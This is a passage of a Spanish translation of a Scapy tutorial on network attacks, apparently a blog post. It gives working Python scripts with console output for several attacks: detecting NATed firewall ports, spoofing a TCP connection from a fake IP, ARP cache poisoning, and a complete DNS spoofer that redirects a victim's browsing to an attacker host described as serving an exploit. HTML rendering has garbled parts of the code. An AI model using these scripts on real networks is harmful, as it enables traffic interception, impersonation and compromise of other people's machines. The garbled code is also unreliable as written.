+<p>Cambia el programa anterior para que use <code>TCP()</code> en lugar de <code>ICMP()</code> y deja que use el <code>dport=80</code>. Al ejecutarlo probablemente fallará porque la última respuesta no fue <span class="caps">ICMP</span>, sino una respuesta <span class="caps">TCP</span> que no tiene el campo &#8216;type&#8217;. Pero eso no importa. Mira el valor del &#8216;ttl&#8217; y si sigue siendo 15 (como es mi caso), el puerto no está NATeado.</p>
+<p>Para hacerlo más automático, aquí está el script completo. Requiere los argumentos &#8216;host&#8217; y &#8216;dport&#8217;:</p>
+<div>
+<p>{% highlight python %}<br />
+  #!/usr/bin/env python</p>
+import sys
+from scapy import *
+conf.verb=0
+if len(sys.argv) != 3:
+print &#8220;Usage: ./firewalk.py <target> <dport>&#8221;
+sys.exit(1)
+dest=sys.argv<sup class="footnote" id="fnr1"><a href="#fn1">1</a></sup>
+port=sys.argv<sup class="footnote" id="fnr2"><a href="#fn2">2</a></sup>
+ttl = 0
+def mkicmppacket():
+global ttl
+ttl = ttl + 1
+p = <acronym title="dst=dest, ttl=ttl"><span class="caps">IP</span></acronym>/<span class="caps">ICMP</span>()
+return p
+def mktcppacket():
+global ttl, dest, port
+ttl = ttl + 1
+p = <acronym title="dst=dest, ttl=ttl"><span class="caps">IP</span></acronym>/<acronym title="dport=int(port"><span class="caps">TCP</span></acronym>, flags=&#8220;S&#8221;)
+return p
+res = sr1(mkicmppacket())
+while res.type == 11:
+res = sr1(mkicmppacket())
+print &#8220;+&#8221;
+nat_ttl = ttl
+<ol>
+	<li>Since we now know our minimum <span class="caps">TTL</span>, we don&#8217;t need to reset <span class="caps">TTL</span> to zero</li>
+	<li>We do need to decrease <span class="caps">TTL</span> or otherwise mkpacket will increase it again</li>
+	<li>which would result in every port being detected as forwarded<br />
+  ttl = ttl &#8211; 1</li>
+</ol>
+res = sr1(mktcppacket())
+while res.proto == 1 and res.type == 11:
+res = sr1(mktcppacket())
+if res.proto != 6:
+print &#8220;Error&#8221;
+sys.exit(1)
+if nat_ttl == ttl: print &#8220;Not NATed (&#8221; + str(nat_ttl) + &quot;, &quot; + str(ttl) + &#8220;)&#8221;
+else: print &quot;This port is NATed. firewall <span class="caps">TTL</span> is &quot; + str(nat_ttl) + &quot;, <span class="caps">TCP</span> port <span class="caps">TTL</span> is &quot; + str(ttl)
+sys.exit(0)
+<p>{% endhighlight %}</p>
+</div>
+<p>Veamos cómo funciona:</p>
+<pre class="console">
+  $ sudo ./firewalk.py XX.XXX.XXX.XX 5900
+  +
+  +
+  ****** Etcetera
+  This port is NATed. Firewall TTL is 10, TCP port TTL is 11
+  $
+
+  $ sudo ./firewalk.py google.com 80
+  +
+  +
+  ****** Etcetera
+  Not NATed (16, 16)
+  $
+</pre>
+<p>Esto es mucho más rápido que usar mi implementación de Hping3 (<span class="caps">HTCL</span>) :-D</p>
+<p>Cuando este script detecta que un host está NATeado, es muy probable que así sea. Si no detecta que un puerto está redireccionado&#8230; eso no es una prueba. No es difícil engañar a esta técnica incrementando en uno el <span class="caps">TTL</span> de cada paquete entrante y de un puerto redireccionado. Aunque dudo que suceda habitualmente.</p>
+<p>Lo siguiente que vamos a hacer es muy divertido. Probablemente, muchos no comprendáis porqué me parece tan excitante. Lo que vamos a hacer es crear una conexión <span class="caps">TCP</span> a un sistema local en la <span class="caps">LAN</span> desde una dirección IP ficticia. Esto significa que vamos a hacer spoofing de la conexión, sólo spoofing no-ciego desafortunadamente. El uso de esta técnica es únicamente educativo. Creo que es excitante porque esta teoría de <span class="caps">TCP</span> que aprendí hace mucho tiempo es el ejemplo más real de conexión <span class="caps">TCP</span> que jamás he visto. Creo que cualquier profesor que explique <span class="caps">TCP</span>/IP debería usarlo como un ejemplo en clase en lugar de toda esa teoría abstracta sobre el mecanismo de ventana deslizante y mierdas :-) <sup class="footnote" id="fnr4"><a href="#fn4">4</a></sup>.</p>
+<p>Echa un vistazo a este script:</p>
+<div>
+<p>{% highlight python %}<br />
+  #!/usr/bin/env python</p>
+import sys
+from scapy import *
+conf.verb=0
+if len(sys.argv) != 4:
+print &#8220;Usage: ./spoof.py <target> <spoofed_ip> <port>&#8221;
+sys.exit(1)
+target = sys.argv<sup class="footnote" id="fnr1"><a href="#fn1">1</a></sup>
+spoofed_ip = sys.argv<sup class="footnote" id="fnr2"><a href="#fn2">2</a></sup>
+port = int(sys.argv<sup class="footnote" id="fnr3"><a href="#fn3">3</a></sup>)
+p1=<acronym title="dst=target,src=spoofed_ip"><span class="caps">IP</span></acronym>/<acronym title="dport=port,sport=5000,flags=&#39;S&#39;"><span class="caps">TCP</span></acronym>
+send(p1)
+print &quot;Okay, <span class="caps">SYN</span> sent. Enter the sniffed sequence number now: &quot;
+seq=sys.stdin.readline()
+print &quot;Okay, using sequence number &quot; + seq
+seq=int(seq[:-1])
+p2=<acronym title="dst=target,src=spoofed_ip"><span class="caps">IP</span></acronym>/<acronym title="dport=port,sport=5000,flags=&#39;A&#39;,ack=seq+1,seq=1"><span class="caps">TCP</span></acronym>
+send(p2)
+print &#8220;Okay, final <span class="caps">ACK</span> sent. Check netstat on your target :-)&#8221;
+<p>{% endhighlight %}</p>
+</div>
+<p>Cuando &#8220;spoofeas&#8221; tu dirección IP, debes asegurarte de que usas una dirección que está fuera de tu <span class="caps">LAN</span>, de otro modo, tu objetivo buscará la dirección <span class="caps">MAC</span> del emisor ficticio usando <span class="caps">ARP</span>. En nuestro caso él asume que los paquetes spoofeados vienen del enrutador y enviará las respuestas a la <span class="caps">MAC</span> del enrutador. Pero si necesitas usar una IP de tu <span class="caps">LAN</span> puede resolverlo poniendo el siguiente código después del envío &#8220;<span class="caps">SYN</span>&#8221;:</p>
+<pre>
+  p = ARP()
+  p.op = 2
+  p.hwsrc = "00:11:22:aa:bb:cc"
+  p.psrc = spoofed_ip
+  p.hwdst = "ff:ff:ff:ff:ff:ff"
+  p.pdst = target
+  send(p)
+</pre>
+<p>Esto es <em><span class="caps">ARP</span> poisoning</em>. (Fíjate en que esto también podría ser útil si quieres spoofear una conexión desde una IP <strong><span class="caps">EXISTENTE</span></strong>, porque puedes mantener el envenenamiento de tu objetivo diciéndole que la dirección <span class="caps">MAC</span> ha cambiado; el host suplantado no podría responder porque las respuestas irían a una <span class="caps">MAC</span> inexistente. Eso implica que puede suplantar totalmente a un sistema conectado.</p>
+<p>Vamos a probar:</p>
+<pre class="console">
+  $ sudo python ./spoof.py 192.168.9.14 123.123.123.123 22
+  Okay, SYN sent. Enter the sniffed sequence number now:
+  231823219
+  Okay, using sequence number 231823219
+
+  Okay, final ACK sent. Check netstat on your target :-)
+  $
+</pre>
+<p>Ahora en mi objetivo ejecuto <code>netstat</code> dos veces, antes y después de enviar el <span class="caps">ACK</span>.</p>
+<pre>
+  tcp        0      0 devil.hengelo.gaast:ssh 123.123.123.123:5000 SYN_RECV
+  tcp        0      0 devil.hengelo.gaast:ssh 123:123.123.123:5000 ESTABLISHED
+</pre>
+<p>¿Cómo es que funciona de todos modos? Bien, por supuesto funciona, poque la conexión <span class="caps">TCP</span> funciona. Estas son las reglas:</p>
+<ul>
+	<li>El atacante envía al objetivo un segmento <span class="caps">SYN</span> con un <acronym title="número de secuencia inicial"><span class="caps">ISN</span></acronym> de 0 y número de reconocimiento también 0.</li>
+	<li>El puerto del objetivo recibe un <span class="caps">SYN</span>, genera un número de secuencia y reconoce nuestro número de secuencia con seq+1, 0+1=1 y envía el segmento a la dirección IP &#8220;spoofeada&#8221;.</li>
+	<li>Capturamos el paquete transmitido y escribimos en él el número de secuencia. Lo he capturado en el sistema objetivo, de otro modo, podría adaptar el script para capturar en la red y hacérselo saber. El número de secuencia se incrementa en 1 para convertirse en el número de reconocimiento. Este número es esencial en nuestro segmento <span class="caps">ACK</span> final para cambiar el estado <span class="caps">TCP</span> a <span class="caps">ESTABLECIDO</span> (sino la conexión estaría medio abierta).</li>
+</ul>
+<p>Normalmente esto sería un problema de seguridad, como puedes ver, todo depende del número de secuencia generado en el lado del objetivo. Si pudiéramos predecir el número de secuencia que genera, podríamos explotar cualquier relación basada en la dirección y a veces incluso robar o terminar conexiones existentes. En el pasado, predecir el número de secuencia era trivial, pero hoy en día todos los sistemas operativos modernos generan <span class="caps">ISN</span> aleatorios decentes. Por supuesto, cualquier relación de confianza como esta que ocurra en una red local se podrá seguir capturando cuando sea necesario. Pero el ataque global está muerto. En especial, el secuestro de conexiónes ciegas es casi imposible. Necesitarías saber aún más, por ejemplo, si quieres terminar (<span class="caps">RESET</span>) una conexión existente.</p>
+<ul>
+	<li>El SN de tu objetivo/víctima</li>
+	<li>la tuplas destino/origen dirección/puerto</li>
+</ul>
+<p>Sin embargo, algunos dispositivos modernos como enrutadores baratos y otro tipo de sistemas empotrados suelen tener pilas <span class="caps">TCP</span>/IP pobres. Dispositivos como cable-modems, modems <span class="caps">DSL</span> o puntos de acceso <span class="caps">WLAN</span> pueden ser vulnerables a ataques viejos. Yo tengo un punto de acceso US Robotics que exporta su tabla <span class="caps">NAT</span> a todo el mundo. Por ejemplo, http://ap/natlist.txt:</p>
+<pre>
+  0) UDP 0.0.0.0:0 &lt;-&gt; 192.168.123.254:1212, out_port:60005, last_use:32
+  1) UDP 0.0.0.0:0 &lt;-&gt; 192.168.123.254:1211, out_port:60004, last_use:32
+  2) UDP 0.0.0.0:0 &lt;-&gt; 192.168.123.254:1210, out_port:60003, last_use:32
+  3) UDP 0.0.0.0:0 &lt;-&gt; 192.168.123.254:1209, out_port:60002, last_use:45
+  4) UDP 0.0.0.0:0 &lt;-&gt; 192.168.123.254:1207, out_port:60001, last_use:17
+</pre>
+<p>Horrible, ¿no? Sería trivial inyectar segmentos en una &#8220;conexión&#8221; <span class="caps">UDP</span> y mucho más fácil hacer ataques contra conexiones <span class="caps">TCP</span> ya que es fácil deducir los números de secuencia. Para terminar una conexión todo lo que necesitas es el número de secuencia de uno de los extremos de la conexión.</p>
+<p>Pero en general, el spoofing ciego está muerto. Otras técnicas como la redirección de tráfico por medio de envenenamiento <span class="caps">ARP</span>, es decir, envenenamiento de tablas de conmutadores, son mucho más exitosas. Otra cosa muy efectiva es el spoofing <span class="caps">DNS</span>. Tal vez incluso ataques contra protocolos de enrutamiento, pero no los veo tan a menudo. Pero todo es posible usando Scapy.</p>
+<p>Voy a explicar un último ejemplo de ataque de red. Esta vez haremos un envenenamiento <span class="caps">DNS</span>.</p>
+<p>Primero, empezamos enviando una petición <span class="caps">DNS</span>. Lo intenté y me llevó un rato entender cómo funcionaba (era la primera vez que programaba un spoofer <span class="caps">DNS</span>). Lo que pasé por alto fue que <span class="caps">DNS</span> usa 0&#215;03 para indicar el &#8216;.&#8217; en &#8220;hackaholic.org&#8221;. Extraño.</p>
+<p><strong>Actualización</strong>: Philippe Biondi (autor de scapy) me envió un email explicándome el error que cometí aquí:</p>
+<p>b1. Estás equivocado sobre <span class="caps">DNS</span>. Tú dices que se usa 0&#215;3 en lugar de un punto. De hecho, <span class="caps">DNS</span> divide los nombres en listas de cadenas en los puntos, y añade la longitud antes de cada cadena o 0&#215;80| (el desplazamiento del siguiente string). Suele ser 0&#215;3 para la mayoría de los <acronym title="Top Level Domain"><span class="caps">TLD</span></acronym>, tal como &#8216;.org&#8217;.</p>
+<p>En cualquier caso, Scapy dice esto sobre <span class="caps">DNS</span>:</p>
+<pre class="console">
+  &gt;&gt;&gt; ls(DNS())
+  id         : ShortField           = 0               (0)
+  qr         : BitField             = 0               (0)
+  opcode     : BitEnumField         = 0               (0)
+  aa         : BitField             = 0               (0)
+  tc         : BitField             = 0               (0)
+  rd         : BitField             = 0               (0)
+  ra         : BitField             = 0               (0)
+  z          : BitField             = 0               (0)
+  rcode      : BitEnumField         = 0               (0)
+  qdcount    : DNSRRCountField      = 0               (None)
+  ancount    : DNSRRCountField      = 0               (None)
+  nscount    : DNSRRCountField      = 0               (None)
+  arcount    : DNSRRCountField      = 0               (None)
+  qd         : DNSQRField           = None            (None)
+  an         : DNSRRField           = None            (None)
+  ns         : DNSRRField           = None            (None)
+  ar         : DNSRRField           = None            (None)
+  &gt;&gt;&gt;
+</pre>
+<p>A la vista de la <a href="http://www.ietf.org/rfc/rfc1035.txt"><span class="caps">RFC</span>-1035</a> veo que los siguientes campos son interesantes para enviar una consulta <span class="caps">DNS</span>:</p>
+<ul>
+	<li>ID: Es un identificador de 16 bits que tu SO utiliza para distinguir entre consultas. De ese modo se puede saber con que consulta corresponde cada respuesta que llega (el ID de la respuesta es el mismo que el de la consulta)</li>
+	<li>QR: Tipo de mensaje (0 significa pregunta, 1 significa respuesta)</li>
+	<li><span class="caps">OPCODE</span>: El tipo de consulta (4 bits). 0 significa consulta estándar, 1 es una consulta inversa, 2 es una petición de estado del servidor.</li>
+	<li><span class="caps">QDCOUNT</span>: Cuántas consultas contiene el mensaje (normalmente 1)</li>
+	<li>QD: Campo de petición. Está formado a su vez por tres campos. Cada campo debe terminar con un byte <span class="caps">NUL</span>.
+	<ul>
+		<li><span class="caps">QNAME</span>: host/domainname (longitud variable), nota: reemplazar &#8216;.&#8217; con 0&#215;03. Por alguna razón, el <span class="caps">QNAME</span> debe empezar con un &#8216;\n&#8217;.</li>
+		<li><span class="caps">QTYPE</span>: Tipo de consulta (2 bytes). Fijado a 01</li>
+		<li><span class="caps">QCLASS</span>: Clase de consulta (2 bytes). Fijado a 01, Internet)</li>
+	</ul></li>
+</ul>
+<p>Vamos a hacerlo. Mi servidor de nombres local es 192.168.9.1. El protocolo de trasporte que uso es <span class="caps">UDP</span>:</p>
+<pre class="console">
+  &gt;&gt;&gt; i = IP()
+  &gt;&gt;&gt; u = UDP()
+  &gt;&gt;&gt; d = DNS()
+  &gt;&gt;&gt; i.dst = "192.168.9.1"
+  &gt;&gt;&gt; u.dport = 53
+  &gt;&gt;&gt; u.sport = 31337
+  &gt;&gt;&gt; d.id = 31337
+  &gt;&gt;&gt; d.qr = 0
+  &gt;&gt;&gt; d.opcode = 0
+  &gt;&gt;&gt; d.qdcount = 1
+  &gt;&gt;&gt; d.qd = '\nhackaholic\x03org\x00\x00\x01\x00\x01'
+  &gt;&gt;&gt; packet = i/u/d
+  &gt;&gt;&gt; sr1(packet)
+  Begin emission:
+  ...*Finished to send 1 packets.
+
+  Received 4 packets, got 1 answers, remaining 0 packets
+  &lt;IP version=4L ihl=5L tos=0x0 len=188 id=12111 flags=DF frag=0L ttl=64 proto=
+  UDP chksum=0x777f src=192.168.9.1 dst=192.168.9.17 options='' |&lt;UDP sport=53
+  dport=31337 len=168 chksum=0xab33 |&lt;DNS id=31337 qr=1L opcode=16 aa=0L tc=0L
+  rd=0L ra=1L z=8L rcode=ok qdcount=1 ancount=1 nscount=5 arcount=0 qd=&lt;DNSQR q
+  name='hackaholic.org.' qtype=A qclass=IN |&gt; an=&lt;DNSRR rrname='hackaholic.org.
+  ' type=A rclass=IN ttl=661L rdata='24.132.169.84' |&gt; ns=&lt;DNSRR rrname='hackah
+  olic.org.' type=NS rclass=IN ttl=1177L rdata='dns4.name-services.com.' |&lt;DNSR
+  R rrname='hackaholic.org.' type=NS rclass=IN ttl=1177L rdata='dns5.name-servi
+  ces.com.' |&lt;DNSRR rrname='hackaholic.org.' type=NS rclass=IN ttl=1177L rdata=
+  'dns1.name-services.com.' |&lt;DNSRR rrname='hackaholic.org.' type=NS rclass=IN
+  ttl=1177L rdata='dns2.name-services.com.' |&lt;DNSRR rrname='hackaholic.org.' ty
+  pe=NS rclass=IN ttl=1177L rdata='dns3.name-services.com.' |&gt;&gt;&gt;&gt;&gt; ar=0 |&lt;Paddi
+  ng load='6g\xa3\xf8' |&gt;&gt;&gt;&gt;
+  &gt;&gt;&gt;
+</pre>
+<p>Ahora también puedes hacer esto:</p>
+<pre class="console">
+  &gt;&gt;&gt; res =sr1(packet)
+  Begin emission:
+  .*Finished to send 1 packets.
+
+  Received 2 packets, got 1 answers, remaining 0 packets
+  &gt;&gt;&gt; res.an.rdata
+  '24.132.169.84'
+  &gt;&gt;&gt;
+</pre>
+<p>Chulo, ¿eh? Ahora que estamos seguros podemos intentar fabricar paquetes <span class="caps">DNS</span>.</p>
+<p>Yo escribí un programa de spoofing <span class="caps">DNS</span> para este artículo que presupone el siguiente escenario:</p>
+<p>Hay dos hosts, A y B, y un enrutador R. R es la pasarela a internet pero también es el servidor de nombres local. Nosotros somos el atacante en el host A, y el host B es nuestra víctima. Queremos conseguir que cualquier dirección que busque el host B sea resuelta con la dirección del host A. Si en el host B alguien arranca un navegador web y escribe una <span class="caps">URL</span>&#8230; cargará nuestra página del host A (por ejemplo un exploit para Internet Explorer para colarnos en el host B).</p>
+<p>Antes de que empieces asegúrate de que tu host A tiene un navegador web. Puedes probar fijando por ejemplo &#8216;google.com&#8217; con la dirección de A en <code>/etc/hosts</code>, Windows (mi host objetivo) también tiene ese fichero (en <code>%windir%\System32\Drivers\etc</code> <span class="caps">IIRC</span>).</p>
+<p>Lo que hacemos es una técnica de envenenamiento <span class="caps">DNS</span> local (en la misma <span class="caps">LAN</span>). Asumimos las siguientes direcciones IP:</p>
+<pre>
+Host A: 192.168.123.100
+Host B: 192.168.123.101
+Host R: 192.168.123.254
+</pre>
+<p>Para &#8220;spoofear&#8221; <span class="caps">DNS</span> necesitamos construir una respuesta <span class="caps">DNS</span> que tenga sentido.. lo que significa que debe responder con el ID correcto a la petición correcta. Para lograrlo necesitamos capturar los paquetes <span class="caps">DNS</span> emitidos por B. El único modo de hacer esto es usar una técnica adicional para redirigir al host B el tráfico destinado a R. Lo haremos mediante envenenamiento <span class="caps">ARP</span>. Si enviamos un paquete <span class="caps">ARP</span> correctamente sintetizado antes de la consulta <span class="caps">DNS</span>, podremos capturar el paquete <span class="caps">DNS</span> y falsificar la respuesta. Generaremos una respuesta falsa con la dirección de A logrando que el navegador cargue y visualice nuestra página maliciosa!</p>
+<p>Estudia y adapta el siguiente código:</p>
+<div>
+<p>{% highlight python %}<br />
+  #!/usr/bin/env python</p>
+import sys
+from scapy import *
+conf.verb=1
+
+			<ol>
+				<li>Adapt the following settings ####<br />
+  conf.iface = &#8216;eth2&#8217;<br />
+  mac_address = &#8216;00:11:22:AA:BB:CC&#8217; # Real Mac address of interface conf.iface (Host A)<br />
+  ####</li>
+			</ol>if len(sys.argv) != 4:
+print &#8220;Usage: ./spoof.py <dns_server> <victim> <impersonating_host>&#8221;
+sys.exit(1)
+dns_server = sys.argv<sup class="footnote" id="fnr1"><a href="#fn1">1</a></sup>
+target=sys.argv<sup class="footnote" id="fnr2"><a href="#fn2">2</a></sup>
+malhost = sys.argv<sup class="footnote" id="fnr3"><a href="#fn3">3</a></sup>
+timevalid = &#8216;\x00\x00\x07\x75&#8217;
+alen = &#8216;\x00\x04&#8217;
+def arpspoof(psrc, pdst, mac):
+a = <span class="caps">ARP</span>()
+a.op = 2
+a.hwsrc = mac
+a.psrc = psrc
+a.hwdst = &#8220;ff:ff:ff:ff:ff:ff&#8221;
+a.pdst = pdst
+send(a)
+def mkdnsresponse(dr, malhost):
+d = <span class="caps">DNS</span>()
+d.id = dr.id
+d.qr = 1
+d.opcode = 16
+d.aa = 0
+d.tc = 0
+d.rd = 0
+d.ra = 1
+d.z = 8
+d.rcode = 0
+d.qdcount = 1
+d.ancount = 1
+d.nscount = 0
+d.arcount = 0
+d.qd = str(dr.qd)
+d.an = str(dr.qd) + timevalid + alen + inet_aton(malhost)
+return d
+ethlen = len(Ether())
+iplen = len(<acronym title=")"><span class="caps">IP</span></acronym>
+udplen = len(<acronym title=")"><span class="caps">UDP</span></acronym>
+arpspoof(dns_server, target, mac_address)
+p = sniff(filter=&#8216;port 53&#8217;, iface=conf.iface, count=1)
+e = p<sup class="footnote" id="fnr0"><a href="#fn0">0</a></sup>
+t = str(e)
+i = <acronym title="t[ethlen:]"><span class="caps">IP</span></acronym>
+u = <acronym title="t[ethlen + iplen:]"><span class="caps">UDP</span></acronym>
+d = <acronym title="t[ethlen + iplen + udplen:]"><span class="caps">DNS</span></acronym>
+dpkt = mkdnsresponse(d, malhost)
+dpkt.display()
+f = <acronym title="src=i.dst, dst=i.src"><span class="caps">IP</span></acronym>/<acronym title="sport=u.dport, dport=u.sport"><span class="caps">UDP</span></acronym>/dpkt
+send(f)
+<p>{% endhighlight %}</p>
+</div>
+<p>Así es cómo funciona, antes de abrir cualquier página en el host B ejecuta algo como esto en el host A (asegurate de cambiar la variable <code>mac_address</code>):</p>
+<pre class="console">
+  detach@luna:~/lab/scapy-0.9.17$ ./spoof.py
+  Usage: ./spoof.py &lt;dns_server&gt; &lt;victim&gt; &lt;impersonating_host&gt;
+  detach@luna:~/lab/scapy-0.9.17$ sudo ./spoof.py 192.168.123.254 192.168.123.101 192.168.123.100
+</pre>
+<p>Esto envenenará la cache <span class="caps">ARP</span> del host B (diciéndole que la <span class="caps">MAC</span> falsa del host R es la <span class="caps">MAC</span> real del host A) y entonces capturaré un paquete <span class="caps">DNS</span>. La información capturada se pasa a nuestra función <code>mkdnsresponse()</code> que generará la respuesta <span class="caps">DNS</span>. ¡Un spoofer <span class="caps">DNS</span> funcional en menos de 100 líneas de código!</p>
+<p>Vamos a intentarlo:</p>
+<pre class="console">
+  detach@luna:~/lab/scapy-0.9.17$ sudo ./spoof.py 192.168.123.254 192.168.123.101 192.168.123.100
+  WARNING: No IP underlayer to compute checksum. Leaving null.
+  .
+  Sent 1 packets.
+  ---[ DNS ]---
+  id        = 140
+  qr        = 1
+  opcode    = 16
+  aa        = 0
+  tc        = 0
+  rd        = 0
+  ra        = 1
+  z         = 8
+  rcode     = ok
+  qdcount   = 1
+  ancount   = 1
+  nscount   = 0
+  arcount   = 0
+  qd        = '\x05start\x07mozilla\x03org\x00\x00\x01\x00\x01'
+  an        = '\x05start\x07mozilla\x03org\x00\x00\x01\x00\x01\x00\x00\x07u\x00\x04\xc0\xa8{d'
+  ns        = 0
+  ar        = 0
+  .
+  Sent 1 packets.
+  detach@luna:~/lab/scapy-0.9.17$
+</pre>
+<p>El paquete que se muestra es la respuesta spoofeada&#8230; y puedes ver que la dirección start.mozilla.org está spoofeada.</p>
+<p>Debo decir que no he leído mucho sobre el protocolo <span class="caps">DNS</span> para programar esto. La mayoría de lo que he aprendido ha sido de Scapy y Ethereal.</p>
+<p><strong>Actualización:</strong> Una persona bondadosa me apunta que en la presentación de Philippe usa la función <code>DNSRR()</code> de scapy para sintetizar respuestas <span class="caps">DNS</span>, que por supuesto es una función más sencilla de alto nivel. Así que deberías cambiar la función <code>mkdnsresponse()</code> por algo como esto:</p>
+<pre>
+  def mkdnsresponse(dr, malhost):
+      d = DNS()
+      d.id = dr.id
+      d.qd = dr.qd
+      d.qdcount = 1
+      d.qr = 1
+      d.opcode = 16
+      d.an = DNSRR(rrname=dr.qd.qname, ttl=10, rdata=malhost)
+      return d
+</pre>
+<p>Otra cosa que se podría hacer más sencilla es la disección. Yo usé el método de bajo nivel <code>ip = IP(str(packet)+len(Ether())</code>, pero podría haber usado:</p>
+<pre>
+  ip = packet.getlayer(IP)
+</pre>
+<p>:-). Perdón por ello.</p>
+<p><strong>Actualización 2</strong>: Philippe Biondi (autor of scapy) menciona también en su email el uso de los mecanismos de respuesta de Scapy para spoofing <span class="caps">DNS</span>. Visita su <a href="http://www.secdev.org/projects/scapy">website</a></p>
+<p>Así que debería reemplazarlo con:</p>
+<pre>
+  i = p[0].getlayer(IP)
+  u = p[0].getlayer(UDP)
+  d = p[0].getlayer(DNS)
+</pre>
+<p>Si tienes cualquier pregunta escríbeme (en inglés) a detach@REMOVEUPPERCASEhackaholic.org</p>
+<p class="footnote" id="fn2"><a href="#fnr2"><sup>2</sup></a> (N. de T.) En sistemas Debian, scapy es un paquete oficial y se puede ejecutar simplemente escribiendo &#8216;scapy&#8217; en un terminal.</p>
+<p class="footnote" id="fn3"><a href="#fnr3"><sup>3</sup></a> (N. de T.) En realidad no son funciones, son clases.</p>
+<p class="footnote" id="fn4"><a href="#fnr4"><sup>4</sup></a> (N. de T.) Se nota que este buen hombre no ha estudiado en la <span class="caps">UCLM</span>. Ya me gustaría a mi poder contar esto en clase y lograr que alguien se enterara.</p>
+      </div>
+
+      
+
+      <hr/>
+
+      <div class="pagination pagination-centered">
+  <ul>
+    
+      <li class="prev"><a href="/recipe/2007-01-27/pygtk-y-glade-guis-instantneas.html" title="PyGTK y Glade, GUIs instantáneas">&larr; Previous</a></li>
+    
+
+    <li><a href="/archive.html">Archive</a></li>
+
+    
+      <li class="next"><a href="/recipe/2007-01-30/webdav-con-apache2-en-debian-gnu-linux.html" title="WebDAV con Apache2 en Debian GNU/Linux">Next &rarr;</a></li>
+    
+  </ul>
+</div>
+
+
+      <hr/>
+
+      
+
+<div id="show_comments"> [ <a onclick="show_comments();"> show comments </a> ] </div>
+
+
+  <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_developer = 1;
+    var disqus_shortname = 'crysol'; // required: replace example with your forum shortname
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+	</div>
+      </div>
+
+      <hr/>
+
+      <footer>
+        <p>&copy; 2020 CRySoL
+          with help from <a href="http://jekyllbootstrap.com" target="_blank" title="The Definitive Jekyll Blogging Framework">Jekyll Bootstrap</a>
+          and <a href="http://twitter.github.com/bootstrap/" target="_blank">Twitter Bootstrap</a>.
+	  See <a href="https://github.com/CRySoL/web.source" target="_blank">site sources</a>.
+	  <br/>
+	  Generated at 2020-04-24 08:38:29 -0500
+	  <br/>
+		<a href="https://travis-ci.org/CRySoL/web.source">
+		   travis-CI <img src="https://api.travis-ci.org/CRySoL/web.source.png?branch=master" alt="_built_"></a>
+	</p>
+	<p>
+	  Visit <a href="https://groups.google.com/forum/?hl=es#!forum/crysol">our forum</a>.
+	</p>
+      </footer>
+
+    </div>
+
+    
+  </body>
+</html>
+
